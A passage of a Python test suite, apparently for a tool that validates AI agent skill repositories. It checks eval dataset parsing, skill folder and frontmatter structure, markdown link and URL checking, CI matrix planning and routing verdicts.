        forced = select_module.plan(["alpha"], routing=False, labels=set(), ignore_gates=True)
        self.assertEqual(len(forced["scoped"]), 1)

    def test_credentials_split_the_two_matrices(self) -> None:
        # A job's credentials are fixed before its matrix expands, so legs that
        # read a scoped environment cannot share a job with legs that do not.
        self.gpu()
        plan = select_module.plan(["alpha", "beta"], routing=True, labels={"enable_gpu_ci"})
        self.assertTrue(all("environment" not in leg for leg in plan["default"]))
        self.assertTrue(all("environment" in leg for leg in plan["scoped"]))
        self.assertEqual([leg["skill"] for leg in plan["scoped"]], ["alpha"])

    def test_hardware_with_no_environment_stays_in_one_matrix(self) -> None:
        # Only credentials force a second job. A repo that rations a pool but
        # pays for it out of the same key should not get an extra one.
        (self.repo.root / "alpha" / "evals" / "machine.yml").write_text(
            "labels: [gpu]\n", encoding="utf-8"
        )
        self.repo.reactivate(scoped_runner="self-hosted", scoped_gate="enable_gpu_ci")
        plan = select_module.plan(["alpha"], routing=False, labels={"enable_gpu_ci"})
        self.assertEqual(plan["scoped"], [])
        self.assertEqual(len(plan["default"]), 1)
        self.assertEqual(
            json.loads(plan["default"][0]["runner"]), ["self-hosted", "gpu", "Linux"]
        )


class TestCaseExpectations(unittest.TestCase):
    """`skill_should_trigger` is the whole expectation."""

    def test_a_triggering_evaluation_targets_the_owning_skill(self) -> None:
        cases, errors = parse(triggers(id="a", prompt="p"))
        self.assertEqual(errors, [])
        self.assertEqual(cases[0].expect_skill, "demo-skill")
        self.assertEqual(cases[0].category, "positive")

    def test_a_non_triggering_evaluation_is_a_near_miss_for_the_owning_skill(self) -> None:
        cases, errors = parse(triggers_nothing(id="a", prompt="p"))
        self.assertEqual(errors, [])
        self.assertIsNone(cases[0].expect_skill)
        self.assertEqual(cases[0].category, "near_miss")

    def test_shared_pool_cases_are_unrelated(self) -> None:
        cases, errors = parse(triggers_nothing(id="a", prompt="p"), skill=None)
        self.assertEqual(errors, [])
        self.assertIsNone(cases[0].expect_skill)
        self.assertEqual(cases[0].category, "unrelated")

    def test_both_kinds_live_in_one_array(self) -> None:
        cases, errors = parse(
            {
                EVALUATIONS_KEY: [
                    {"id": "a", TRIGGER_KEY: True, "prompt": "p"},
                    {"id": "b", TRIGGER_KEY: False, "prompt": "q"},
                ]
            }
        )
        self.assertEqual(errors, [])
        self.assertEqual([c.skill_should_trigger for c in cases], [True, False])

    def test_has_behavior_only_when_something_is_asserted(self) -> None:
        cases, _ = parse(
            {
                EVALUATIONS_KEY: [
                    {"id": "a", TRIGGER_KEY: True, "prompt": "p"},
                    {
                        "id": "b",
                        TRIGGER_KEY: True,
                        "prompt": "p",
                        "expected_behavior": ["do the thing"],
                    },
                ]
            }
        )
        self.assertFalse(cases[0].has_behavior)
        self.assertTrue(cases[1].has_behavior)


class TestDatasetRejections(unittest.TestCase):
    def test_missing_id(self) -> None:
        _, errors = parse(triggers(prompt="p"))
        self.assertTrue(any("`id`" in e for e in errors), errors)

    def test_missing_prompt(self) -> None:
        _, errors = parse(triggers(id="a"))
        self.assertTrue(any("`prompt`" in e for e in errors), errors)

    def test_the_trigger_flag_is_required(self) -> None:
        # Defaulting it would recreate the hazard the flag exists to remove:
        # an omitted field silently deciding the routing expectation.
        _, errors = parse({EVALUATIONS_KEY: [{"id": "a", "prompt": "p"}]})
        self.assertTrue(any(TRIGGER_KEY in e for e in errors), errors)

    def test_the_trigger_flag_must_be_a_boolean(self) -> None:
        for value in ("yes", "true", 1, None):
            with self.subTest(value=value):
                _, errors = parse(
                    {EVALUATIONS_KEY: [{"id": "a", "prompt": "p", TRIGGER_KEY: value}]}
                )
                self.assertTrue(any(TRIGGER_KEY in e for e in errors), errors)

    def test_an_empty_dataset(self) -> None:
        _, errors = parse({EVALUATIONS_KEY: []})
        self.assertTrue(any("non-empty array" in e for e in errors), errors)

    def test_evaluations_must_be_an_array(self) -> None:
        _, errors = parse({EVALUATIONS_KEY: {"id": "a", "prompt": "p"}})
        self.assertTrue(any("non-empty array" in e for e in errors), errors)

    def test_a_non_triggering_evaluation_takes_a_prompt_and_nothing_else(self) -> None:
        # No skill is ever loaded for these, so there is no behavioral phase for
        # an assertion to be graded in or a workspace to be staged into.
        for key, value in (
            ("expected_behavior", ["x"]),
            ("unexpected_behavior", ["x"]),
            ("logs_contain", ["x"]),
            ("files_exist", ["x"]),
            ("workspace", "evals/files/thing"),
        ):
            with self.subTest(key):
                _, errors = parse(triggers_nothing(id="a", prompt="p", **{key: value}))
                self.assertTrue(
                    any(f"`{key}`" in e and TRIGGER_KEY in e for e in errors), errors
                )

    def test_a_non_triggering_evaluation_never_reaches_behavioral(self) -> None:
        cases, errors = parse(triggers_nothing(id="a", prompt="p", note="why"))
        self.assertEqual(errors, [])
        self.assertFalse(cases[0].has_behavior)

    def test_the_shared_pool_cannot_expect_a_trigger(self) -> None:
        _, errors = parse(triggers(id="a", prompt="p"), skill=None)
        self.assertEqual(len(errors), 1, errors)
        self.assertIn("belongs to no skill", errors[0])

    def test_string_lists_reject_a_bare_string(self) -> None:
        _, errors = parse(triggers(id="a", prompt="p", expected_behavior="do the thing"))
        self.assertTrue(any("array of non-empty strings" in e for e in errors), errors)

    def test_duplicate_ids_are_found(self) -> None:
        cases, _ = parse(
            {
                EVALUATIONS_KEY: [
                    {"id": "a", TRIGGER_KEY: True, "prompt": "p"},
                    {"id": "a", TRIGGER_KEY: False, "prompt": "q"},
                ]
            }
        )
        self.assertEqual(datasets.duplicate_ids(cases), ["a"])


class TestTier0(unittest.TestCase):
    def setUp(self) -> None:
        self.repo = Repo(self)
        self.repo.skill("demo-skill", dataset=tier0_dataset("demo"))
        self.repo.activate()

    def test_thin_dataset_is_rejected(self) -> None:
        cases, _ = parse(triggers(id="a", prompt="p"))
        errors = datasets.tier0_errors("demo-skill", cases)
        self.assertTrue(any(f"{TRIGGER_KEY}: true" in e for e in errors), errors)
        self.assertTrue(any(f"{TRIGGER_KEY}: false" in e for e in errors), errors)

    def test_the_minimum_dataset_passes(self) -> None:
        cases, errors = parse(tier0_dataset("demo"), skill="demo-skill")
        self.assertEqual(errors, [])
        self.assertEqual(datasets.tier0_errors("demo-skill", cases), [])

    def test_a_skill_with_no_dataset_is_reported(self) -> None:
        self.repo.skill("bare-skill")
        errors = datasets.tier0_errors("bare-skill", [])
        self.assertEqual(len(errors), 1)
        self.assertIn("no eval dataset", errors[0])


class TestExtendedDataset(unittest.TestCase):
    """The optional second dataset: same format, no bar, opt-in run."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.repo.activate()

    def extra(self) -> dict:
        return {
            EVALUATIONS_KEY: [
                {
                    "id": "extended-one",
                    TRIGGER_KEY: True,
                    "prompt": "p",
                    "expected_behavior": ["do the thing"],
                }
            ]
        }

    def load(self, payload: dict | None, *, extended: bool) -> list:
        name = f"skill-{int(payload is not None)}{int(extended)}"
        self.repo.skill(name, dataset=tier0_dataset(name), extended=payload)
        return datasets.load_dataset(name, extended=extended)

    def test_cases_are_added_only_when_asked_for(self) -> None:
        required = {c.id for c in self.load(self.extra(), extended=False)}
        both = {c.id for c in self.load(self.extra(), extended=True)}
        self.assertNotIn("extended-one", required)
        self.assertIn("extended-one", both)

    def test_extended_cases_are_marked_and_others_are_not(self) -> None:
        cases = {c.id: c for c in self.load(self.extra(), extended=True)}
        self.assertTrue(cases["extended-one"].extended)
        self.assertFalse(any(c.extended for c in cases.values() if c.id != "extended-one"))

    def test_a_missing_file_is_not_an_error(self) -> None:
        self.assertTrue(self.load(None, extended=True))

    def test_extended_cases_do_not_count_towards_tier0(self) -> None:
        # Otherwise a skill could clear the mandatory bar with prompts this
        # repo never runs.
        self.repo.skill("demo-skill", dataset=tier0_dataset("demo"))
        cases, errors = parse(tier0_dataset("demo"), skill="demo-skill", extended=True)
        self.assertEqual(errors, [])
        self.assertTrue(all(c.extended for c in cases))
        self.assertTrue(
            datasets.tier0_errors("demo-skill", [c for c in cases if not c.extended])
        )

    def test_the_format_is_the_same_one(self) -> None:
        # No separate parser, so an extended dataset is rejected for the same
        # reasons the required one is.
        _, errors = parse(triggers(prompt="p"), extended=True)
        self.assertTrue(any("`id`" in e for e in errors), errors)


class TestWholeRepoStructure(unittest.TestCase):
    """What `skillscope structural` guarantees about a repo, whichever repo it is."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.hooks = "def check(run, case, ctx):\n    pass\n"
        self.repo.skill(
            "alpha",
            dataset=tier0_dataset("alpha"),
            hooks=self.hooks,
            workspace={"evals/files/stub/main.py": "print('hi')\n"},
        )
        self.repo.skill("beta", dataset=tier0_dataset("beta"))
        self.repo.activate(routing_skills="alpha,beta")

    def test_a_healthy_repo_checks_out_clean(self) -> None:
        self.assertEqual(datasets.structural_errors(), [])

    def test_a_skill_without_a_dataset_fails_the_structural_checks(self) -> None:
        self.repo.skill("undocumented")
        self.assertTrue(any("undocumented" in e for e in datasets.structural_errors()))

    def test_duplicate_ids_across_skills_are_caught(self) -> None:
        # Ids are repo-wide because routing pools every listed skill's cases.
        self.repo.skill("gamma", dataset=tier0_dataset("alpha"))
        self.assertTrue(any("duplicate case id" in e for e in datasets.structural_errors()))

    def test_a_workspace_pointing_nowhere_is_caught(self) -> None:
        dataset = tier0_dataset("delta")
        dataset[EVALUATIONS_KEY].append(
            {
                "id": "delta-staged",
                TRIGGER_KEY: True,
                "prompt": "edit it",
                "workspace": "evals/files/missing",
                "files_exist": ["main.py"],
            }
        )
        self.repo.skill("delta", dataset=dataset)
        self.assertTrue(any("`workspace`" in e for e in datasets.structural_errors()))

    def test_every_skill_with_a_dataset_is_a_declared_skill(self) -> None:
        self.assertEqual(
            sorted(datasets.declared_skills()), sorted(datasets.skills_with_datasets())
        )

    def test_every_listed_skill_brings_prompts_to_the_routing_run(self) -> None:
        # A skill in the room with no gradeable prompt of its own would silently
        # drop out of the score rather than failing.
        listed = config.active().routing_skills
        cases = datasets.routing_cases(list(listed))
        covered = {case.expect_skill for case in cases if case.expect_skill}
        self.assertEqual(sorted(covered), sorted(listed))

    def test_hooks_are_importable_and_expose_known_entry_points(self) -> None:
        known = {"setup_session", "setup", "teardown", "check"}
        for skill in datasets.skills_with_datasets():
            if not datasets.hooks_path(skill).is_file():
                continue
            with self.subTest(skill=skill):
                module = behavior.load_hooks(skill)
                exported = {
                    name
                    for name in dir(module)
                    if not name.startswith("_") and callable(getattr(module, name))
                }
                self.assertTrue(exported & known, f"{skill} hooks export nothing usable")

    def test_the_shipped_negatives_pool_parses(self) -> None:
        shared = datasets.load_shared_negatives()
        self.assertTrue(shared)
        self.assertTrue(all(c.category == "unrelated" for c in shared))

    def test_template_is_a_valid_dataset(self) -> None:
        # New owners copy this file, so a template the parser rejects would
        # greet every one of them with an error they did not cause.
        template = json.loads(datasets.TEMPLATE.read_text(encoding="utf-8"))
        cases, errors = parse(template, skill="alpha")
        self.assertEqual(errors, [])
        self.assertEqual(datasets.tier0_errors("alpha", cases), [])


class TestTheGateAPaidRunPassesFirst(unittest.TestCase):
    """Which skills the structural checks cover before any tokens are spent.

    A run asked for one skill is gated on that skill. Holding it back for a
    neighbour's mistake would make one skill's malformed file everybody else's
    problem, and the repo-wide answer is what `structural` is for.
    """

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.repo.skill("alpha", dataset=tier0_dataset("alpha"))
        # The neighbour, with a machine.yml naming a key that does not exist.
        self.repo.skill(
            "beta", dataset=tier0_dataset("beta"), machine="runner_type: mi300x\n"
        )
        self.repo.activate(routing_skills="alpha,beta")

    def args(self, *argv) -> argparse.Namespace:
        return cli.build_parser().parse_args([*argv, "--skip-preflight"])

    def fails(self, call, *arguments) -> str:
        """The stderr of a gate that stopped the run."""
        stderr = io.StringIO()
        with contextlib.redirect_stderr(stderr), self.assertRaises(SystemExit):
            call(*arguments)
        return stderr.getvalue()

    def test_a_neighbours_mistake_does_not_stop_a_run_of_one_skill(self) -> None:
        selected = cli._prepare_graded_run(self.args("behavioral", "--skill", "alpha"))
        self.assertEqual(selected, ["alpha"])

    def test_the_selected_skills_own_mistake_still_stops_it(self) -> None:
        stderr = self.fails(
            cli._prepare_graded_run, self.args("behavioral", "--skill", "beta")
        )
        self.assertIn("runner_type", stderr)

    def test_routing_is_gated_on_everyone_in_the_room(self) -> None:
        # A routing score is about all of them, so all of them are read --
        # whichever one --skill narrows the report to.
        stderr = self.fails(
            cli._prepare_graded_run,
            self.args("routing", "--skill", "alpha"),
            ["alpha", "beta"],
        )
        self.assertIn("runner_type", stderr)

    def test_routing_reads_the_room_and_not_the_repo(self) -> None:
        # A routing run leaves --skill off, so the gate has to take its scope
        # from the room rather than from "every skill that has a dataset".
        self.repo.reactivate(routing_skills="alpha")
        args = self.args("routing", "--routing-skills", "alpha")
        self.assertEqual(cli._prepare_graded_run(args, ["alpha"]), ["alpha", "beta"])

    def test_the_repo_wide_check_still_covers_the_repo(self) -> None:
        self.assertIn("runner_type", self.fails(cli._structural_or_exit))

    def test_a_neighbours_broken_link_is_not_this_runs_problem(self) -> None:
        (self.repo.root / "beta" / "reference.md").write_text(
            "[gone](./nowhere.md)\n", encoding="utf-8"
        )
        self.assertIn("nowhere.md", self.fails(cli._structural_or_exit))
        self.assertEqual(cli._structural_or_exit(["alpha"]), [])

    def test_the_docs_tree_waits_for_the_repo_wide_check(self) -> None:
        # --docs is a repo's own markdown, so it belongs to no skill's run.
        self.repo.reactivate(docs="*.md")
        (self.repo.root / "README.md").write_text("[gone](./nowhere.md)\n", encoding="utf-8")
        self.assertIn("README.md", self.fails(cli._structural_or_exit))
        self.assertEqual(cli._structural_or_exit(["alpha"]), [])

    def test_a_duplicate_id_outside_the_scope_is_the_repo_wide_checks_business(self) -> None:
        self.repo.skill("gamma", dataset=tier0_dataset("alpha"))
        self.assertEqual(datasets.structural_errors(["alpha"]), [])
        self.assertTrue(
            any("duplicate case id" in e for e in datasets.structural_errors())
        )


class TestSkillStructure(unittest.TestCase):
    """The skill folder itself: what the format requires, and what a repo adds."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.folder = self.repo.skill("demo-skill", dataset=tier0_dataset("demo"))
        self.repo.activate()

    def write(self, text: str, skill: str = "demo-skill") -> None:
        (self.repo.root / skill / "SKILL.md").write_text(text, encoding="utf-8")

    def declares(self, frontmatter: str, body: str = "\n# Demo\n") -> None:
        self.write(f"---\n{frontmatter}\n---\n{body}")

    def test_a_skill_in_shape_reports_nothing(self) -> None:
        self.assertEqual(structure.errors(), [])

    def test_a_skill_md_without_frontmatter_is_never_loaded_by_an_agent(self) -> None:
        self.write("# Demo\n\nNo frontmatter at all.\n")
        errors = structure.errors()
        self.assertEqual(len(errors), 1, errors)
        self.assertIn("frontmatter", errors[0])

    def test_frontmatter_that_is_not_yaml_is_reported_as_such(self) -> None:
        self.declares("name: [demo-skill\ndescription: broken")
        self.assertTrue(any("not valid YAML" in e for e in structure.errors()))

    def test_frontmatter_that_is_not_a_mapping_is_reported(self) -> None:
        self.declares("- demo-skill\n- a list, not a mapping")
        self.assertTrue(any("must be a mapping" in e for e in structure.errors()))

    def test_a_missing_name_or_description_is_reported_separately(self) -> None:
        self.declares("summary: neither field is here")
        errors = structure.errors()
        self.assertEqual(len(errors), 2, errors)
        self.assertTrue(any("`name`" in e for e in errors))
        self.assertTrue(any("`description`" in e for e in errors))

    def test_a_name_that_disagrees_with_the_folder_is_reported(self) -> None:
        # The folder name is the skill's identity in its dataset, in a routing
        # verdict, and in the report, so a frontmatter name that differs makes
        # every one of those about a skill that does not exist.
        self.declares("name: other-skill\ndescription: Does things.")
        self.assertTrue(any("`demo-skill`" in e for e in structure.errors()))

    def test_a_name_that_is_not_lowercase_with_hyphens_is_reported(self) -> None:
        self.repo.skill("Demo_Skill", dataset=tier0_dataset("odd"))
        self.assertTrue(
            any("lowercase-with-hyphens" in e for e in structure.errors())
        )

    def test_a_name_longer_than_the_format_allows_is_reported(self) -> None:
        long_name = "a" * (structure.MAX_NAME_LENGTH + 1)
        self.repo.skill(long_name, dataset=tier0_dataset("long"))
        self.assertTrue(
            any(f"{len(long_name)} characters" in e for e in structure.errors())
        )

    def test_a_name_claiming_a_reserved_word_is_reported(self) -> None:
        self.repo.skill("claude-helper", dataset=tier0_dataset("helper"))
        self.assertTrue(any("`claude`" in e for e in structure.errors()))

    def test_a_description_longer_than_the_format_allows_is_reported(self) -> None:
        self.declares(
            f"name: demo-skill\ndescription: {'d' * (structure.MAX_DESCRIPTION_LENGTH + 1)}"
        )
        self.assertTrue(any("`description` is" in e for e in structure.errors()))

    def test_a_body_past_the_limit_is_reference_material_in_the_wrong_file(self) -> None:
        lines = "\n".join(f"line {i}" for i in range(structure.MAX_BODY_LINES + 1))
        self.declares("name: demo-skill\ndescription: Does things.", f"\n{lines}\n")
        self.assertTrue(any("sibling files" in e for e in structure.errors()))

    def test_blank_lines_around_the_body_do_not_count_against_it(self) -> None:
        lines = "\n".join(f"line {i}" for i in range(structure.MAX_BODY_LINES))
        self.declares("name: demo-skill\ndescription: Does things.", f"\n\n{lines}\n\n\n")
        self.assertEqual(structure.errors(), [])

    def test_a_globbed_directory_with_no_skill_file_is_passed_over(self) -> None:
        # A directory holding no SKILL.md is not a skill, and the default glob
        # matches every directory in the repo, so reporting one would be a line
        # per README folder.
        (self.repo.root / "notes").mkdir(parents=True)
        self.assertEqual(structure.errors(), [])

    def test_a_repo_that_requires_nothing_extra_requires_nothing_extra(self) -> None:
        self.assertEqual(structure.errors(), [])

    def test_a_file_the_repo_requires_of_every_skill_has_to_be_there(self) -> None:
        self.repo.reactivate(skill_files="skill-card.md")
        errors = structure.errors()
        self.assertEqual(len(errors), 1, errors)
        self.assertIn("skill-card.md", errors[0])

    def test_a_required_card_has_to_carry_the_sections_it_is_for(self) -> None:
        self.repo.reactivate(
            skill_files="skill-card.md", skill_sections="Description,Owner,License"
        )
        (self.folder / "skill-card.md").write_text(
            "# Skill Card\n\n## Description\n\nWhat it does.\n\n## Owner\n\n", encoding="utf-8"
        )
        errors = structure.errors()
        self.assertEqual(len(errors), 2, errors)
        self.assertTrue(any("`## Owner` section is empty" in e for e in errors))
        self.assertTrue(any("no `## License` section" in e for e in errors))

    def test_a_complete_card_passes(self) -> None:
        self.repo.reactivate(
            skill_files="skill-card.md", skill_sections="Description,Owner,License"
        )
        (self.folder / "skill-card.md").write_text(
            "# Skill Card\n\n## Description\n\nWhat it does.\n\n"
            "## Owner\n\nA team.\n\n## License\n\nMIT\n",
            encoding="utf-8",
        )
        self.assertEqual(structure.errors(), [])

    def test_a_required_file_that_is_not_markdown_only_has_to_exist(self) -> None:
        self.repo.reactivate(
            skill_files="scripts/detect.py", skill_sections="Description"
        )
        path = self.folder / "scripts" / "detect.py"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("print('hi')\n", encoding="utf-8")
        self.assertEqual(structure.errors(), [])

    def test_a_malformed_skill_stops_a_run_before_it_spends_anything(self) -> None:
        self.declares("name: demo-skill")
        with self.assertRaises(SystemExit):
            cli._structural_or_exit()


class TestARepoWhereNoSkillWasFound(unittest.TestCase):
    """Grading nothing is reported, because a green check for it would lie."""

    def test_finding_no_skill_is_itself_the_finding(self) -> None:
        repo = Repo(self)
        repo.activate()
        errors = structure.errors()
        self.assertEqual(len(errors), 1, errors)
        self.assertIn("no skill found", errors[0])

    def test_the_globs_that_matched_nothing_are_named(self) -> None:
        # A glob pointing somewhere the skills are not is the usual cause, so
        # the message has to say which one was used.
        repo = Repo(self)
        repo.skill("shipped", dataset=tier0_dataset("shipped"), where="agents/skills")
        repo.activate(skills_dir="skills/*")
        self.assertIn("skills/*", structure.errors()[0])

    def test_an_example_glob_is_offered_only_to_a_caller_who_passed_none(self) -> None:
        # Suggesting one to a caller who just passed one would be suggesting
        # the glob that found nothing.
        repo = Repo(self)
        repo.activate()
        self.assertIn("such as", structure.errors()[0])
        repo.reactivate(skills_dir="skills/*")
        self.assertNotIn("such as", structure.errors()[0])

    def test_a_run_asked_for_docs_still_has_work_to_do(self) -> None:
        # --docs is a repo checking its own prose, which is a real run in a
        # repo that ships no skill at all.
        repo = Repo(self)
        repo.activate(docs="*.md")
        self.assertEqual(structure.errors(), [])


def targets(text: str) -> list[str]:
    """Every reference the extractor finds in one markdown document."""
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "doc.md"
        path.write_text(text, encoding="utf-8")
        return [reference.target for reference in references.collect([path])]


class TestReferenceExtraction(unittest.TestCase):
    """What counts as a reference, and what is only a picture of one."""

    def test_every_way_markdown_spells_a_link(self) -> None:
        found = targets(
            "[inline](./a.md) and ![image](img/b.png)\n"
            '[titled](./c.md "why")\n'
            "[spaced](<./d e.md>)\n"
            "<https://example.com/auto>\n"
            'Raw <a href="./f.md">html</a> and <img src="g.png">\n'
            "Bare https://example.com/bare in a sentence.\n"
            "[style][ref]\n"
            "\n"
            "[ref]: ./h.md\n"
        )
        self.assertEqual(
            sorted(found),
            sorted(
                [
                    "./a.md",
                    "img/b.png",
                    "./c.md",
                    "./d e.md",
                    "https://example.com/auto",
                    "./f.md",
                    "g.png",
                    "https://example.com/bare",
                    "./h.md",
                ]
            ),
        )

    def test_code_and_comments_are_illustrations_not_promises(self) -> None:
        # A link in a code sample is showing you what a link looks like; a
        # commented-out one was deliberately taken out of the document.
        found = targets(
            "```markdown\n[fenced](./fenced.md)\n```\n"
            "~~~\n[tilde](./tilde.md)\n~~~\n"
            "Inline `[code](./code.md)` span.\n"
            "<!-- [comment](./comment.md) -->\n"
            "<!--\n[multi](./multi.md)\n-->\n"
            "[real](./real.md)\n"
        )
        self.assertEqual(found, ["./real.md"])

    def test_a_reference_remembers_where_it_was_written(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "doc.md"
            path.write_text("first\n\n[link](./a.md)\n", encoding="utf-8")
            reference = references.collect([path])[0]
        self.assertEqual((reference.source, reference.line), (path, 3))


class TestAnchors(unittest.TestCase):
    """Heading slugs, by the rules a repository host renders them with."""

    def test_headings_become_the_anchors_they_render_as(self) -> None:
        found = references.anchors(
            "# Title Here\n"
            "## Punctuation: it's dropped!\n"
            "### `code` in a heading\n"
            "#### [linked](https://example.com) heading\n"
            '<a id="hand-written"></a>\n'
        )
        self.assertEqual(
            found,
            {
                "title-here",
                "punctuation-its-dropped",
                "code-in-a-heading",
                "linked-heading",
                "hand-written",
            },
        )

    def test_a_repeated_heading_is_suffixed(self) -> None:
        self.assertEqual(references.anchors("## Dup\n## Dup\n## Dup\n"), {"dup", "dup-1", "dup-2"})

    def test_a_heading_inside_a_fence_is_a_comment_not_a_heading(self) -> None:
        self.assertEqual(references.anchors("```\n# Shell Comment\n```\n"), set())


class TestInternalReferences(unittest.TestCase):
    """Relative paths and anchors, resolved against the repo under test."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.folder = self.repo.skill("demo", dataset=tier0_dataset("demo"))
        self.repo.activate()

    def write(self, relative: str, text: str) -> Path:
        path = self.folder / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        return path

    def errors(self) -> list[str]:
        return references.internal_errors(references.collect())

    def test_a_link_to_a_file_that_exists_is_fine(self) -> None:
        self.write("reference.md", "# Reference\n")
        self.write("scripts/detect.py", "print('hi')\n")
        self.write("SKILL.md", "[ref](./reference.md) [script](scripts/detect.py) [dir](scripts)\n")
        self.assertEqual(self.errors(), [])

    def test_a_link_to_a_file_that_does_not_exist_is_reported(self) -> None:
        self.write("SKILL.md", "\n[gone](./reference.md)\n")
        errors = self.errors()
        self.assertEqual(len(errors), 1, errors)
        self.assertIn("SKILL.md:2", errors[0])
        self.assertIn("`./reference.md`", errors[0])

    def test_an_anchor_is_checked_against_the_file_it_points_into(self) -> None:
        self.write("reference.md", "# Reference\n\n## Known Section\n")
        self.write(
            "SKILL.md",
            "# Demo\n\n## Local Section\n\n"
            "[here](#local-section) [there](./reference.md#known-section)\n"
            "[nowhere](#missing) [neither](./reference.md#missing)\n",
        )
        errors = self.errors()
        self.assertEqual(len(errors), 2, errors)
        self.assertTrue(all("#missing" in error for error in errors))

    def test_a_fragment_on_something_that_is_not_markdown_is_left_alone(self) -> None:
        # `#L20` is rendered by the host out of the file's line numbers, and
        # nothing in the file declares it.
        self.write("scripts/detect.py", "print('hi')\n")
        self.write("SKILL.md", "[line](scripts/detect.py#L1)\n")
        self.assertEqual(self.errors(), [])

    def test_root_relative_links_resolve_from_the_repo_root(self) -> None:
        self.write("SKILL.md", "[ok](/demo/SKILL.md) [no](/demo/gone.md)\n")
        errors = self.errors()
        self.assertEqual(len(errors), 1, errors)
        self.assertIn("/demo/gone.md", errors[0])

    def test_percent_encoding_is_decoded_before_the_file_is_looked_for(self) -> None:
        self.write("a file.md", "# Spaced\n")
        self.write("SKILL.md", "[spaced](./a%20file.md)\n")
        self.assertEqual(self.errors(), [])

    def test_addresses_and_urls_are_not_paths(self) -> None:
        self.write(
            "SKILL.md",
            "[mail](mailto:someone@example.com) [call](tel:+1234) "
            "[web](https://example.com/nope)\n",
        )
        self.assertEqual(self.errors(), [])

    def test_only_skill_markdown_is_read_until_docs_says_otherwise(self) -> None:
        (self.repo.root / "README.md").write_text("[gone](./nowhere.md)\n", encoding="utf-8")
        self.assertEqual(self.errors(), [])
        self.repo.reactivate(docs="*.md")
        errors = self.errors()
        self.assertEqual(len(errors), 1, errors)
        self.assertIn("README.md:1", errors[0])

    def test_a_broken_reference_stops_a_run_before_it_spends_anything(self) -> None:
        self.write("SKILL.md", "[gone](./reference.md)\n")
        with self.assertRaises(SystemExit):
            cli._structural_or_exit()


class TestExternalReferences(unittest.TestCase):
    """Fetching URLs: which ones, how the answer is judged, and what is said."""

    def setUp(self) -> None:
        self.repo = Repo(self)
        self.folder = self.repo.skill("demo", dataset=tier0_dataset("demo"))
        self.repo.activate()

    def markdown(self, text: str) -> list:
        (self.folder / "SKILL.md").write_text(text, encoding="utf-8")
        return references.collect()

    def test_only_external_urls_are_fetched_and_each_one_only_once(self) -> None:
        found = self.markdown(
            "[a](https://example.com/page#one) [b](https://example.com/page#two)\n"
            "[c](./local.md) [d](mailto:someone@example.com)\n"
        )
        asked: list[str] = []
        references.external_errors(found, probe=lambda url: asked.append(url) or "")
        self.assertEqual(asked, ["https://example.com/page"])

    def test_an_unreachable_url_says_where_it_was_written(self) -> None:
        found = self.markdown("line one\n[dead](https://example.com/gone)\n")
        errors = references.external_errors(found, probe=lambda url: "HTTP 404")
        self.assertEqual(len(errors), 1, errors)
        self.assertIn("https://example.com/gone", errors[0])
        self.assertIn("HTTP 404", errors[0])
        self.assertIn("SKILL.md:2", errors[0])

    def test_an_excluded_url_is_never_asked_about(self) -> None:
        found = self.markdown(
            "[gated](https://intranet.example.com/x) [open](https://example.com/y)\n"
        )
        asked: list[str] = []
        errors = references.external_errors(
            found,
            exclude=[r"^https://intranet\.example\.com/"],
            probe=lambda url: asked.append(url) or "HTTP 403",
        )
        self.assertEqual(asked, ["https://example.com/y"])
        self.assertEqual(len(errors), 1, errors)


class TestExternalProbe(unittest.TestCase):
    """When an answer from a server counts as "the reference is fine"."""

    URL = "https://example.com/thing"

    def opener(self, **outcomes):
        """A stand-in for urlopen answering per HTTP method."""

        def open_url(request, timeout=None):
            outcome = outcomes[request.get_method()]
            if isinstance(outcome, Exception):
                raise outcome
            response = mock.MagicMock()
            response.__enter__.return_value.status = outcome
            return response

        return open_url

    def probe(self, **outcomes) -> str:
        with mock.patch("urllib.request.urlopen", self.opener(**outcomes)):
            return references._probe(self.URL, timeout=1.0, retries=0)

    def http_error(self, code: int) -> urllib.error.HTTPError:
        return urllib.error.HTTPError(self.URL, code, "nope", None, None)

    def test_a_plain_success(self) -> None:
        self.assertEqual(self.probe(HEAD=200), "")

    def test_rate_limiting_means_the_host_is_there(self) -> None:
        self.assertEqual(self.probe(HEAD=self.http_error(429)), "")

    def test_a_refused_head_is_asked_again_as_a_get(self) -> None:
        # Plenty of servers answer HEAD with 403 or 405 and the same URL with
        # 200 on GET. That is a server preference, not link rot.
        self.assertEqual(self.probe(HEAD=self.http_error(405), GET=200), "")

    def test_a_head_that_never_comes_back_is_asked_again_as_a_get(self) -> None:
        # The failure that matters most: a host that black-holes HEAD would
        # otherwise be reported as rotten on the strength of a method it
        # simply does not serve.
        self.assertEqual(self.probe(HEAD=TimeoutError("timed out"), GET=200), "")

    def test_what_is_reported_is_what_a_reader_following_the_link_would_get(self) -> None:
        detail = self.probe(HEAD=self.http_error(405), GET=self.http_error(410))
        self.assertEqual(detail, "HTTP 410")

    def test_a_url_nobody_serves(self) -> None:
        detail = self.probe(HEAD=self.http_error(404), GET=self.http_error(404))
        self.assertEqual(detail, "HTTP 404")

    def test_a_host_that_does_not_resolve(self) -> None:
        unresolvable = urllib.error.URLError("Name or service not known")
        detail = self.probe(HEAD=unresolvable, GET=unresolvable)
        self.assertIn("Name or service not known", detail)


class TestRoutingClassification(unittest.TestCase):
    def test_verdicts(self) -> None:
        cases = [
            ("skill-a", "skill-a", "correct_trigger"),
            (None, None, "true_negative"),
            ("skill-a", None, "missed_trigger"),
            ("skill-a", "skill-b", "wrong_skill"),
            (None, "skill-a", "false_trigger"),
        ]
        for expect, observed, verdict in cases:
            with self.subTest(expect=expect, observed=observed):
                self.assertEqual(routing.classify(expect, observed), verdict)

    def test_only_correct_and_true_negative_pass(self) -> None:
        self.assertEqual(routing.PASSING_VERDICTS, {"correct_trigger", "true_negative"})


class TestRoutingGate(unittest.TestCase):
    """What turns a routing run red. By default: any wrong decision."""

    def totals(self, passed: int, graded: int, **extra) -> dict:
        return {
            "passed": passed,
            "graded": graded,
            "accuracy": round(passed / graded, 3) if graded else None,
            "activations": graded,
            "activations_expected": graded,
            **extra,
        }

